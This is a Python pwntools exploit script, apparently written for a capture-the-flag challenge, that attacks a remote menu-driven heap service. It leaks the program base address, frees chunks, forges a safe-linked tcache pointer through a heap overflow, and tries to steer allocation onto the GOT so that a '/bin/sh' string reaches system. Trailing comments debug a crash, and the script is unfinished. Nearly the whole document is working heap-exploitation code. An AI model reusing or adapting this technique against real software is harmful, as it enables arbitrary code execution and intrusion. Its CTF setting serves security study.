from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)
register(3, 1, 16, b'/bin/sh\x00' + b'D'*8)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
system_plt = base_addr + 0x1150

delete(2)
delete(1)
delete(0)

target_addr = base_addr + 0x35f0
fd = target_addr ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# The crash was here! We allocated 16 bytes for chunk 2.
# But maybe 0x35f0 doesn't map to a valid page? It's inside the binary!
# Oh, the binary's .got / .data is Read-Write.
# But wait, GLIBC 2.34 introduced "Safe-Linking" and checks that the returned chunk address is aligned to 16.
# target_addr is 0x35f0.
# Let's verify base_addr + 0x35f0 is 16-byte aligned.
# base_addr is page aligned (ends in 000). So base_addr + 0x35f0 ends in f0.
# f0 % 16 = 0. Yes, it IS 16-byte aligned!
# So why did it crash?
# Ah! "Tcache checks the count".
# Since we deleted 3 chunks of size 16 (chunk 2, 1, 0), the count for size 16 is 3.
# We then did `register(0)` which used 1 byte (size 16), count becomes 2.
# Then `register(1)` uses size 16, count becomes 1.
# Then `register(2)` uses size 16, count becomes 0!
# We had 3 items in tcache, and we allocated 3 items. So the count is fine!
# What if it crashes because we overwrite something important at 0x35f0?
# What is at 0x35f0? Let's check `objdump -R wideload`.
# 35d8 R_X86_64_GLOB_DAT  __cxa_finalize
# 35f8 R_X86_64_JUMP_SLOT  free
# 3600 R_X86_64_JUMP_SLOT  puts
# Wait, what is between 35e0 and 35f8?
# Let's just run an objdump on that part of the binary.
p.close()
